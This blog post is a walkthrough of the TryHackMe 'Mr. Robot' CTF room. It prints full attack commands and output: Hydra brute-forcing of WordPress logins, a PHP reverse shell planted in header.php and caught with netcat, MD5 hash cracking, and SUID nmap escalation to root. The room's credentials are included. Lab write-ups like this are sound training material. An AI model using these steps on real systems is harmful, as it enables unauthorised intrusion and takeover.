---
layout: post
title: Mr. Robot
author: Mitchell Stein
tags:
- jekyll theme
- jekyll
date: 2021-11-02
tags: [TryHackMe, WebApp, Linux]
categories: [Practice]
toc:  true
---

Mr. Robot is a TryHackMe room based around the TV show of the same name.

## Enumeration

### Nmap

Starting off like all the rest, perform an Nmap

```shell
$ nmap -sC -sV -o nmap 10.10.63.176
Nmap scan report for 10.10.63.176
Host is up (0.12s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
```

### Webapp

Perusing around the webpage of the machine you can find a robots.txt file (seems on theme). The file contains the following items:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Downloading the .dic file to our local machine we can see it is a 858,160 line long file we can use for password guessing.

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─# wget 10.10.167.86/fsocity.dic
--2021-11-27 09:59:09--  http://10.10.167.86/fsocity.dic
Connecting to 10.10.167.86:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6.9M) [text/x-c]
Saving to: ‘fsocity.dic’

fsocity.dic              100%[===========>]   6.91M  1.17MB/s    in 6.8s

2021-11-27 09:59:16 (1.02 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]


┌──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─# cat fsocity.dic | wc -l
858160
```

This length is insane, and thankfully it is absolutely FILLED with duplicate entries. We can shorten this down with the following command

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─# cat fsocity.dic | sort | uniq | wc -l
11451
```

This reduces the wordlist by a staggering **_98.7%_**! Remember to always clean your datasets kids.

### Gobuster

```zsh
──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─# gobuster dir -u 10.10.167.86 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x 301,404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.86
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              301,404
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/11/27 10:17:12 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 233] [--> http://10.10.63.176/blog/]
/login                (Status: 302) [Size: 0] [--> http://10.10.63.176/wp-login.php]
/images               (Status: 301) [Size: 235] [--> http://10.10.63.176/images/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.63.176/]
/sitemap              (Status: 200) [Size: 0]
/image                (Status: 301) [Size: 0] [--> http://10.10.63.176/image/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.63.176/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.63.176/admin/]
/wp-login.php         (Status: 200) [Size: 2664]
/wp-login             (Status: 200) [Size: 2664]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.63.176/feed/]
/license.txt          (Status: 200) [Size: 309]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.63.176/wp-includes/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.63.176/Image/]
/wp-register.php      (Status: 301) [Size: 0] [--> http://10.10.63.176/wp-login.php?action=register]
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://10.10.63.176/feed/]
```

Looks like we have a WordPress site!

## Abusing fsocity.dic

Sadly, we do not have a username to go off of to use the fsocity.dic file on. However on the other hand we have a fsocity.dic file to go off of to find a username.

We can use Hydra for this user enumeration.

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─# hydra -L fsocity.dic 10.10.167.86 -p test http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 64
. . .
[DATA] attacking http-post-form://10.10.167.86:80/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username
[80][http-post-form] host: 10.10.167.86   login: Elliot   password: test
[80][http-post-form] host: 10.10.167.86   login: elliot   password: test
```

And now we can use "Elliot" for password guessing!

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─# hydra -l Elliot -P fsocity.dic  10.10.167.86 http-post-form  "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered" -t 64
. . .
[80][http-post-form] host: 10.10.167.86   login: Elliot   password: ER28-0652
```

## Reverse Shell

Now that we can log into the WordPress site, to get a reverse shell on the system we can edit the header.php file under Appearance > Editor > header.php

I personally like to upload my reverse shells into this file just under the header comment section. A great php-reverse-shell to use is [pentestmonkey's](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).

After adding the reverse shell navigate to http://10.10.167.86/header.php

```zsh
┌──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.6.89.80] from (UNKNOWN) [10.10.7.84] 44094
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 15:25:45 up 10 min,  0 users,  load average: 0.03, 0.10, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: cant access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(root💀kali-linux-2021-1)-[/home/parallels/THM/Mr.Robot]
└─$ stty raw -echo;fg
[1]  + continued  nc -nlvp 4444

daemon@linux:/$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@linux:/$
```

## User Enumeration

Looking through the files on the system we find a robot user folder with some interesting files

```console
daemon@linux:/$ cd /home;ls
robot

daemon@linux:/home$ cd robot/
daemon@linux:/home/robot$ ls
key-2-of-3.txt	password.raw-md5

daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

daemon@linux:/home/robot$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

## Robot user

Using [crackstation.net](https://crackstation.net) we can get password for the hash.

`c3fcd3d76192e4007dfb496cca67e13b : abcdefghijklmnopqrstuvwxyz`

Now that we are authenticated as Robot, we can read the second key file under /home/robot.

This user also has no sudo commands to run but we can enumerate the SUID binaries we can run with the following one-liner:

```sh
robot@linux:~$ find / -type f -perm -04000 -ls 2>/dev/null
 15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
 15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount
 15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount
 15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
 15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su
 36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd
 36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp
 36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh
 36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn
 36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd
 36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo
 34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap
 38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign
 38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown
```

The most interesting one here is nmap, and according to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#suid) we can exploit nmap to gain a root shell.

```sh
robot@linux:~$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
```

With this we can read the final key file and complete the machine.